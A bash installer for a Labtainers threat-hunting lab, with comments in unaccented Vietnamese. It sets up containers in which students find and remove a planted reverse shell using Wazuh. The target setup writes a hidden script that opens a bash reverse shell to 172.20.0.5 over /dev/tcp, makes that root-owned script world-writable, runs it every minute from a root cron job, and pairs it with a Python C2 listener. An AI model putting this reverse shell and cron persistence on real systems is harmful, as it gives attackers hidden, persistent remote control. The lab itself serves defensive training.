#!/bin/bash
# ============================================================================
# Tu dong tao lab soc-threathunt (Reverse shell + Threat Hunting) tren VM Labtainers.
# Chay tren VM:  bash install-soc-threathunt.sh
# Sau do:        cd $LABTAINER_DIR/scripts/labtainer-student && rebuild soc-threathunt
# ============================================================================
set -e
if [ -z "$LABTAINER_DIR" ]; then echo "LOI: chua co bien LABTAINER_DIR (hay mo terminal Labtainers)"; exit 1; fi
LAB=$LABTAINER_DIR/labs/soc-threathunt
echo ">> Tao thu muc lab tai $LAB"
rm -rf "$LAB"
mkdir -p "$LAB"
mkdir -p "$LAB/attacker/_bin"
cat > "$LAB/attacker/_bin/fixlocal.sh" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Chay LAN DAU tren container attacker (an). Khoi dong C2 listener ngam,
# tach hoan toan khoi tien trinh khoi tao (setsid + &) de chay lien tuc.
setsid python3 /home/ubuntu/listen.py >/home/ubuntu/c2.log 2>&1 < /dev/null &
exit 0
__EOF_TH_7k2m__
mkdir -p "$LAB/attacker"
cat > "$LAB/attacker/listen.py" <<'__EOF_TH_7k2m__'
#!/usr/bin/env python3
# C2 listener: nghe cong C2PORT, GHI LOG moi ket noi reverse shell goi ve,
# va GIU ket noi mo (de phia phong thu thay ket noi ESTABLISHED khi dieu tra).
import socket
import threading
import time

HOST = "0.0.0.0"
PORT = C2PORT  # ca nhan hoa qua RAND_REPLACE

def handle(conn, addr):
    print(time.strftime("%Y-%m-%d %H:%M:%S"), "CONNECT from", addr, flush=True)
    try:
        conn.sendall(b"id\n")          # gui 1 lenh (mo phong C2 ra lenh)
        while True:
            data = conn.recv(4096)     # giu ket noi, doc output shell
            if not data:
                break
    except Exception:
        pass
    finally:
        print(time.strftime("%Y-%m-%d %H:%M:%S"), "DISCONNECT", addr, flush=True)

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((HOST, PORT))
srv.listen(5)
print(time.strftime("%Y-%m-%d %H:%M:%S"), "C2 listening on", PORT, flush=True)

while True:
    try:
        conn, addr = srv.accept()
        threading.Thread(target=handle, args=(conn, addr), daemon=True).start()
    except Exception:
        time.sleep(1)
__EOF_TH_7k2m__
mkdir -p "$LAB/config"
cat > "$LAB/config/about.txt" <<'__EOF_TH_7k2m__'
SOC Lab - Reverse shell + Threat Hunting.
May target da bi nhiem san: mot cronjob dinh ky bung reverse shell ve may tan cong (C2).
Nhiem vu: SAN moi de doa qua SIEM (Wazuh FIM + tien trinh/ket noi), xac dinh IOC,
roi go sach persistence (cron + script doc) va vá lo hong de no khong tai ket noi.
__EOF_TH_7k2m__
mkdir -p "$LAB/config"
cat > "$LAB/config/parameter.config" <<'__EOF_TH_7k2m__'
# parameter.config - ca nhan hoa (chong chep bai)
# Moi sinh vien co CONG C2 khac nhau -> ket noi reverse shell toi 172.20.0.5:<cong khac nhau>.
# Token C2PORT thay bang so ngau nhien trong CA target (script doc) LAN attacker (listener)
# => dung mot gia tri cho ca hai. Grading van tinh (match 172.20.0.5:<bat ky cong nao>).
C2PORT : RAND_REPLACE : target:.local/bin/fixlocal.sh;attacker:listen.py : C2PORT : 20000 : 65000
__EOF_TH_7k2m__
mkdir -p "$LAB/config"
cat > "$LAB/config/start.config" <<'__EOF_TH_7k2m__'
# start.config - Lab soc-threathunt (Reverse shell + Threat Hunting)
# target bi NHIEM SAN: cron moi phut bung reverse shell ve attacker (C2 listener).
# Sinh vien SAN moi de doa qua Wazuh (FIM + tien trinh), roi go sach persistence.

GLOBAL_SETTINGS
	LAB_MASTER_SEED soc-threathunt_student_master_seed
	GRADE_CONTAINER target

NETWORK  SOC_NET
	MASK 172.20.0.0/24
	GATEWAY 172.20.0.101

# --- May nan nhan: bi nhiem san, noi sinh vien dieu tra + go bo ---
CONTAINER target
	USER ubuntu
	SOC_NET 172.20.0.10
	ADD-HOST attacker:172.20.0.5
	ADD-HOST siem:172.20.0.20
	TERMINALS 1

# --- Ke tan cong: C2 listener, chay ngam (TERMINALS 0 = "hidden") ---
CONTAINER attacker
	USER ubuntu
	SOC_NET 172.20.0.5
	ADD-HOST target:172.20.0.10
	TERMINALS 0

# --- SIEM: chay Wazuh (indexer + server + dashboard) ---
CONTAINER siem
	USER ubuntu
	SOC_NET 172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	TERMINALS 1

# --- DEFENDER: tram analyst, co Firefox de xem dashboard Wazuh ---
CONTAINER defender
	USER ubuntu
	SOC_NET 172.20.0.30
	ADD-HOST siem:172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	X11 YES
	TERMINALS 1
__EOF_TH_7k2m__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/student_startup.sh" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Chay trong terminal ao cua defender. Mo Wazuh dashboard trong Firefox.
# Chi chay duoi quyen user thuong (khong phai root).
if ! id | grep -q 'uid=0'; then
  ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
fi
__EOF_TH_7k2m__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-threathunt.attacker.student" <<'__EOF_TH_7k2m__'
#
# Labtainer Dockerfile - attacker (C2 listener, an)
#
ARG registry
FROM $registry/labtainer.network
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# python3 de chay C2 listener (socket trong thu vien chuan, khong can pip)
RUN apt-get update && apt-get install -y --no-install-recommends python3 \
    && rm -rf /var/lib/apt/lists/* || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_TH_7k2m__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-threathunt.defender.student" <<'__EOF_TH_7k2m__'
#
# Labtainer Dockerfile - defender (tram analyst, co Firefox xem dashboard Wazuh)
#
ARG registry
# firefox3 = Firefox moi (tren network3) - chay duoc dashboard Wazuh hien dai
FROM $registry/labtainer.firefox3
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Firefox co san trong base firefox3; them ssh client de SSH sang target xu ly su co
RUN apt-get update || true; apt-get install -y --no-install-recommends openssh-client \
    && rm -rf /var/lib/apt/lists/*
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
# Base firefox3 co the da co san user 'ubuntu' -> chi tao neu chua co
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_TH_7k2m__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-threathunt.siem.student" <<'__EOF_TH_7k2m__'
#
# Labtainer Dockerfile - siem (chay Wazuh: indexer + server + dashboard)
#
ARG registry
FROM $registry/labtainer.base2
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Cong cu cho bake + cai offline (setcap = libcap2-bin)
RUN apt-get update && apt-get install -y --no-install-recommends curl gnupg tar libcap2-bin openssl \
    && rm -rf /var/lib/apt/lists/*
#
# Cho prestop doc alerts + agent_control khong can mat khau (de cham diem)
RUN echo 'ubuntu ALL=(ALL) NOPASSWD: /bin/cat /var/ossec/logs/alerts/alerts.log, /usr/bin/cat /var/ossec/logs/alerts/alerts.log, /var/ossec/bin/agent_control' > /etc/sudoers.d/labtainer-wazuh \
    && chmod 440 /etc/sudoers.d/labtainer-wazuh
#
# --- PRE-BAKE: tai goi Wazuh + tao chung chi luc BUILD (de first-boot cai OFFLINE) ---
RUN mkdir -p /root/wz && cd /root/wz \
 && curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh \
 && bash wazuh-install.sh -dw deb -da amd64 \
 && curl -sO https://packages.wazuh.com/4.14/config.yml \
 && sed -i 's/<[a-z0-9-]*-ip>/127.0.0.1/g' config.yml \
 && bash wazuh-install.sh -g
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_TH_7k2m__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-threathunt.target.student" <<'__EOF_TH_7k2m__'
#
# Labtainer Dockerfile - target (bi nhiem san reverse shell + Wazuh agent)
#
ARG registry
# Base co san openssh-server (sshd) + rsyslog -> giu de analyst SSH sang
FROM $registry/labtainer.network.ssh
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Cho prestop/analyst chay sudo khong mat khau mot so lenh dieu tra
RUN echo '%sudo ALL=(ALL) NOPASSWD: /usr/bin/crontab, /bin/crontab, /usr/bin/cat, /bin/cat, /usr/sbin/ss, /sbin/ss, /bin/ss, /usr/bin/stat, /bin/stat' > /etc/sudoers.d/labtainer-hunt \
    && chmod 440 /etc/sudoers.d/labtainer-hunt
#
# cron (persistence) + iproute2 (ss) cho dieu tra ket noi
RUN apt-get update && apt-get install -y --no-install-recommends cron iproute2 \
    && rm -rf /var/lib/apt/lists/* || true
#
# --- Wazuh agent (bake luc build, tro ve manager 172.20.0.20) ---
RUN apt-get update && apt-get install -y --no-install-recommends apt-transport-https ca-certificates curl gnupg
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import \
    && chmod 644 /usr/share/keyrings/wazuh.gpg
RUN echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
RUN apt-get update && WAZUH_MANAGER="172.20.0.20" apt-get install -y wazuh-agent
RUN systemctl enable wazuh-agent
RUN systemctl enable cron 2>/dev/null || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_TH_7k2m__
mkdir -p "$LAB/docs"
cat > "$LAB/docs/read_first.txt" <<'__EOF_TH_7k2m__'
=== SOC Lab: Reverse shell + Threat Hunting (Wazuh SIEM) ===

May "target" DA BI NHIEM SAN: mot cronjob dinh ky (moi phut) bung REVERSE SHELL ve may
tan cong (C2). Ban KHONG biet truoc file doc o dau - phai SAN (threat hunting) qua SIEM.

Nhiem vu: DIEU TRA qua Wazuh, xac dinh IOC, roi GO SACH persistence + CAT DUT C2 +
VA LO HONG de no khong tai ket noi. Thao tac tu tram DEFENDER.

*** Lan dau: cho siem cai Wazuh xong (~8-10'):  tail -f /var/log/wazuh-install.log ***

--- 1) San moi de doa tren dashboard (defender, Firefox tu mo) ---
  https://172.20.0.20   admin / (tren siem: sudo cat /root/wazuh-admin-credentials.txt)
  -> Vao muc "Integrity monitoring" (FIM): tim FILE LA / bi thay doi lien tuc
     (goi y: /usr/local/bin, /etc/cron.d, /tmp). Ghi lai duong dan file doc.

--- 2) Dieu tra sau tren target (SSH tu defender) ---
  ssh analyst@target            (mat khau: analyst)
  a. Xem persistence:   cat /etc/cron.d/*            (tim dong cron la)
                        ls -la /usr/local/bin/        (file doc, chu y quyen 0777 = LO HONG)
  b. Xem ket noi C2:    sudo ss -tnp | grep -v 127.0.0.1    (tim ket noi ra 172.20.0.5:<cong>)
                        -> ghi lai C2 IP + CONG (moi sinh vien mot cong khac nhau)
  c. Ghi bao cao:       sua /home/analyst/findings.txt theo dinh dang KEY=value:
       C2_IP=172.20.0.5
       C2_PORT=<cong ban tim duoc>
       MAL_SCRIPT=/usr/local/bin/.sysupdate
       CRON_PERIOD=moi phut

--- 3) Go sach + va lo hong (LAM THEO THU TU) ---
  d. Xoa cron TRUOC (chan tai cai):   sudo rm -f /etc/cron.d/sysupdate
  e. Kill tien trinh reverse shell:   sudo ss -tnp | grep 172.20.0.5     # xem pid=NNN
                                      sudo kill -9 <NNN>
  f. Xoa script doc + lock/beacon:    sudo rm -f /usr/local/bin/.sysupdate /tmp/.sysupd.lock /tmp/.c2beacon
  g. Kiem chung: sudo ss -tn | grep 172.20.0.5    -> KHONG con ket noi nao.

Xong: checkwork (tu kiem tra) hoac stoplab (nop bai).
Muc tieu: incident_resolved = Y  (het cron + het ket noi C2 + het tien trinh doc).
__EOF_TH_7k2m__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/goals.config" <<'__EOF_TH_7k2m__'
# goals.config - tieu chi dat/khong dat (Reverse shell + Threat Hunting)

# Dieu tra / phat hien
threat_detected   = boolean : _siem_detected
agent_connected   = boolean : _agent_connected
reported_ioc      = boolean : _reported

# Go bo (nhieu buoc)
cron_removed      = boolean : ( _marker and_not _cron )
vuln_patched      = boolean : ( _marker and_not _script_ww )
process_killed    = boolean : ( _marker and_not _proc )
no_c2_connection  = boolean : ( _marker and_not _c2 )

# MUC TIEU TONG: go sach persistence + cat dut C2 (khong con cron, khong con ket noi, khong con tien trinh)
incident_resolved = boolean : ( _marker and_not _cron and_not _c2 and_not _proc )
__EOF_TH_7k2m__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/results.config" <<'__EOF_TH_7k2m__'
# results.config - trich du lieu cham diem (doc tu prestop.stdout)

_marker    = target:prestop.stdout : FILE_REGEX : PRESTOP_MARKER
# Con cron doc? (chi khop dong cron tham chieu script, da gan tien to CRONLINE:)
_cron      = target:prestop.stdout : FILE_REGEX : CRONLINE:
# Script con world-writable? (octet cuoi co bit ghi cho 'other': 2,3,6,7)
_script_ww = target:prestop.stdout : FILE_REGEX : SCRIPT_STAT=[0-7][0-7][2367]
# Con tien trinh reverse shell dang chay?
_proc      = target:prestop.stdout : FILE_REGEX : PROC:
# Con ket noi C2 toi attacker (bat ky cong nao)?
_c2        = target:prestop.stdout : FILE_REGEX : C2_CONN=[1-9]
# Analyst da ghi IOC (C2 IP)?
_reported  = target:prestop.stdout : FILE_REGEX : C2_IP=172\.20\.0\.5
# SIEM co canh bao (FIM/syscheck ve file doc hoac beacon)?
_siem_detected   = siem:prestop.stdout : FILE_REGEX : (syscheck|Integrity|sysupdate|c2beacon|cron)
_agent_connected = siem:prestop.stdout : FILE_REGEX : target.*Active

# --- Goi y checkwork ---
#CHECK_FALSE: Van con cronjob doc (CRONLINE). Hay xoa: sudo rm -f /etc/cron.d/sysupdate
cw_cron = target:prestop.stdout : FILE_REGEX : CRONLINE:
#CHECK_FALSE: Script doc van world-writable (lo hong chua va). Hay xoa script hoac bo quyen ghi cho 'other'.
cw_ww = target:prestop.stdout : FILE_REGEX : SCRIPT_STAT=[0-7][0-7][2367]
#CHECK_FALSE: Van con ket noi reverse shell toi C2. Tim PID: sudo ss -tnp | grep 172.20.0.5 ; roi kill.
cw_c2 = target:prestop.stdout : FILE_REGEX : C2_CONN=[1-9]
#CHECK_TRUE: Chua ghi IOC vao /home/analyst/findings.txt (vi du: C2_IP=172.20.0.5).
cw_report = target:prestop.stdout : FILE_REGEX : C2_IP=172\.20\.0\.5
__EOF_TH_7k2m__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/fixlocal.sh" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Lan khoi dong dau tren siem: tu cai Wazuh all-in-one o CHE DO NEN (~10-15 phut).
# $1 = mat khau sudo. Chi cai neu chua co (/var/ossec).
PW="$1"
if [ ! -d /var/ossec ]; then
  echo "$PW" | sudo -S nohup bash /home/ubuntu/wazuh-setup.sh >/dev/null 2>&1 &
fi
exit 0
__EOF_TH_7k2m__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/prestop" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Chay luc 'checkwork'/'stoplab' tren siem. Chup bang chung SIEM phat hien moi de doa.
trap "echo Timed out; exit" SIGTERM

echo "=== wazuh alerts (FIM / reverse shell / 172.20.0.5) ==="
sudo -n cat /var/ossec/logs/alerts/alerts.log 2>/dev/null \
  | grep -iE 'syscheck|integrity|sysupdate|c2beacon|cron|172.20.0.5' | tail -50

echo "=== agents ==="
sudo -n /var/ossec/bin/agent_control -l 2>/dev/null
__EOF_TH_7k2m__
mkdir -p "$LAB/siem"
cat > "$LAB/siem/wazuh-setup.sh" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Chay boi root o lan boot dau (goi tu fixlocal.sh). Cai Wazuh OFFLINE tu goi da bake san.
# Khong can internet. Tien do ghi vao /var/log/wazuh-install.log
cd /root/wz 2>/dev/null || cd /root
echo "[wazuh-setup] Cai Wazuh OFFLINE, bat dau luc $(date)" > /var/log/wazuh-install.log
bash wazuh-install.sh -a -o >> /var/log/wazuh-install.log 2>&1
echo "[wazuh-setup] Hoan tat luc $(date)" >> /var/log/wazuh-install.log
# Trich mat khau admin ra file de tien tra cuu
tar -O -xf /root/wz/wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt 2>/dev/null \
  | grep -A1 "'admin'" > /root/wazuh-admin-credentials.txt 2>/dev/null
__EOF_TH_7k2m__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/fixlocal.sh" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Chay LAN DAU tren target, quyen user 'ubuntu'. $1 = mat khau sudo.
# Gieo "nhiem san": script doc world-writable + cron moi phut -> reverse shell ve C2.
PW="$1"

# ============ 1) Script doc (LO HONG: world-writable 0777) ============
cat > /tmp/.sysupdate <<'SH'
#!/bin/bash
# "sysupdate" - thuc chat la beacon reverse shell (persistence)
exec 2>/dev/null
# Chi 1 instance (giu ket noi ben vung, tranh chong chat tien trinh)
exec 9>/tmp/.sysupd.lock
flock -n 9 || exit 0
touch /tmp/.c2beacon
# exec -a: dat ten tien trinh = .sysupdate de hien ro trong 'ps' (cho SV san)
exec -a .sysupdate bash -i >& /dev/tcp/172.20.0.5/C2PORT 0>&1
SH
echo "$PW" | sudo -S cp /tmp/.sysupdate /usr/local/bin/.sysupdate
echo "$PW" | sudo -S chmod 0777 /usr/local/bin/.sysupdate   # <== LO HONG: ai cung ghi duoc
echo "$PW" | sudo -S chown root:root /usr/local/bin/.sysupdate

# ============ 2) Persistence: cron chay moi phut (duoi quyen root) ============
echo "$PW" | sudo -S bash -c 'echo "* * * * * root /usr/local/bin/.sysupdate" > /etc/cron.d/sysupdate; chmod 644 /etc/cron.d/sysupdate'
echo "$PW" | sudo -S service cron restart 2>/dev/null \
  || echo "$PW" | sudo -S systemctl restart cron 2>/dev/null || true

# ============ 3) Wazuh FIM: giam sat realtime thu muc bi dong cham ============
FIM='<directories realtime="yes" check_all="yes" report_changes="yes">/usr/local/bin,/etc/cron.d,/tmp</directories>'
echo "$PW" | sudo -S sed -i "s#<syscheck>#<syscheck>\n    ${FIM}#" /var/ossec/etc/ossec.conf 2>/dev/null
echo "$PW" | sudo -S systemctl restart wazuh-agent 2>/dev/null \
  || echo "$PW" | sudo -S service wazuh-agent restart 2>/dev/null || true

# ============ 4) Tai khoan analyst cho DEFENDER SSH sang xu ly ============
echo "$PW" | sudo -S useradd -m -s /bin/bash analyst 2>/dev/null
echo "$PW" | sudo -S bash -c 'echo "analyst:analyst" | chpasswd'
echo "$PW" | sudo -S usermod -aG sudo analyst 2>/dev/null
cat > /tmp/findings.txt <<'FND'
# BAO CAO SAN MOI DE DOA - dien gia tri ban tim duoc (giu dinh dang KEY=value):
C2_IP=
C2_PORT=
MAL_SCRIPT=
CRON_PERIOD=
FND
echo "$PW" | sudo -S cp /tmp/findings.txt /home/analyst/findings.txt
echo "$PW" | sudo -S chown analyst:analyst /home/analyst/findings.txt
echo "$PW" | sudo -S chmod 644 /home/analyst/findings.txt

exit 0
__EOF_TH_7k2m__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/prestop" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Chup trang thai target luc checkwork/stoplab -> prestop.stdout (dung cham diem).
# Tat ca world-readable nen khong can sudo.
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER"

echo "=== cron (persistence) ==="
{ cat /etc/cron.d/* 2>/dev/null; sudo -n crontab -l -u root 2>/dev/null; } \
  | grep -iE 'sysupdate|dev/tcp' | sed 's/^/CRONLINE: /'

echo "SCRIPT_STAT=$(stat -c '%a %n' /usr/local/bin/.sysupdate 2>/dev/null || echo MISSING)"

echo "=== tien trinh nghi ngo ==="
ps -ef 2>/dev/null | grep -E 'sysupdate|/dev/tcp' | grep -v grep | sed 's/^/PROC: /'

echo "C2_CONN=$(ss -tn 2>/dev/null | grep -c '172.20.0.5:')"

echo "=== findings.txt (bao cao analyst) ==="
cat /home/analyst/findings.txt 2>/dev/null

echo "=== (GV doi chieu) IOC that: script=/usr/local/bin/.sysupdate ; cron=/etc/cron.d/sysupdate (moi phut) ; C2=172.20.0.5 ==="
__EOF_TH_7k2m__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/treataslocal" <<'__EOF_TH_7k2m__'
cron
wazuh-agent
__EOF_TH_7k2m__

echo ">> Cap quyen thuc thi + chuan hoa EOL (LF)"
chmod +x "$LAB"/attacker/_bin/*.sh "$LAB"/target/_bin/* "$LAB"/siem/_bin/* "$LAB"/defender/_bin/*.sh "$LAB"/siem/*.sh "$LAB"/attacker/*.py 2>/dev/null || true
find "$LAB" -type f -exec sed -i 's/\r$//' {} +

echo ">> XONG. Tiep theo:"
echo "   cd $LABTAINER_DIR/scripts/labtainer-student && rebuild soc-threathunt"
